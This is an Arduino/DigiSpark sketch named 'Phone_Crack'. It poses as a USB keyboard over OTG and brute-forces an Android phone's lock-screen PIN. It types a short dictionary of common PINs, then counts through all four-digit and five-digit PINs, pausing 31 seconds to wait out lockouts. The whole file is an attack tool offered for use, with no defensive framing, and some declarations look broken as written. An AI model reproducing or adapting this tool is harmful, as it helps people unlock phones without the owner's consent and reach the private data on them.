/*===============================================
Phone_Crack -  4 Digit PIN - Brute Force Attack on Android 
Smartphones that Supports OTG-Usb  
    AMH Tech Sl sco
===============================================*/

#include "DigiKeyboard.h"
int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
int pin_dict[][] = {{30, 30, 30, 30}, {30, 39, 38, 37}, {31, 31, 31, 31}, {31, 32, 33, 34}, {31, 32, 32, 33}, {31, 32, 33, 35}, {36, 36, 36, 36}, {39, 39, 39, 38}};
int a = 0; //1st digit
int b = 0; //2nd digit
int c = 0; //3rd digit
int d = 0; //4th digit
int e = 0; //5th digit
int dict_size = 8;
int count = dict_counter = 0;
bool key_stroke_e = false;

void setup()
{
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0); //this is generally not necessary but with some older systems it seems to prevent missing the first character after a delay
  delay(3000);
}

void loop()
{
  //After 5 attempts, initialize 31000 ms wait to retry.
  if(count == 5 || count == 10 || count > 10)
  {
    digitalWrite(1,HIGH); //Change this to 0 if using DigiSpark model B
    DigiKeyboard.sendKeyStroke(40); //we hit enter to make the popup go away
    delay(31000);
//    count = 0;
    digitalWrite(1,LOW);
  }
  /*Sends keystrokes based upon the values between 0-9 
  It will start bruting 5 digits if a exceeds 10*/
  if (key_stroke_e == false && dict_size == 1)
  {
    DigiKeyboard.sendKeyStroke(num[a]);
    DigiKeyboard.sendKeyStroke(num[b]);
    DigiKeyboard.sendKeyStroke(num[c]);
    DigiKeyboard.sendKeyStroke(num[d]);
  }
  else
  {
    for(dict_counter; dict_counter < 8; dict_counter++)
    {
      DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][0]);
      DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][1]);
      DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][2]);
      DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][3]);
      dict_size--;
    }
  }
  //check for whether it is true. If so, use 5 digits instead.
  if (key_stroke_e == true)
  {
    DigiKeyboard.sendKeyStroke(num[a]);
    DigiKeyboard.sendKeyStroke(num[b]);
    DigiKeyboard.sendKeyStroke(num[c]);
    DigiKeyboard.sendKeyStroke(num[d]);
    DigiKeyboard.sendKeyStroke(num[e]);
  }
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);
//  Use the dictionary while increasing count until 20
if (dict_size != 1 && count < 20)
    count++;
  else
//  Normal counter to brute force while acco
  {
    d++;
    if (count < 20)
      count++;
    //If the 4th digit is past 9, it cycles back to 0 and increments the 3rd digit 
    if(d == 10)
    {
      d = 0;
      c++;
      //If the 3rd digit is past 9, it cycles back to 0 and increments the 2nd digit
      if(c == 10)
      {
        c = 0;
        b++;
        //If the 2nd digit is past 9, it cycles back to 0 and increments the 1st digit
        if(b == 10)
        {
          b = 0;
          a++; //if the 1st digit is past 9 it'll probably just throw out errors.
    if(a == 10)
    {
      //remain_true will equal true, loop through void(), and send the 5th keystroke
      key_stroke_e = true;
      e++;
      //Remember that brute forcing will still work, despite its strange order.
      //After e == 10, it will become 0 again.
      if(e == 10)
      {
        e = 0;
      }
    }
        }  
      }
    }
  }    
}
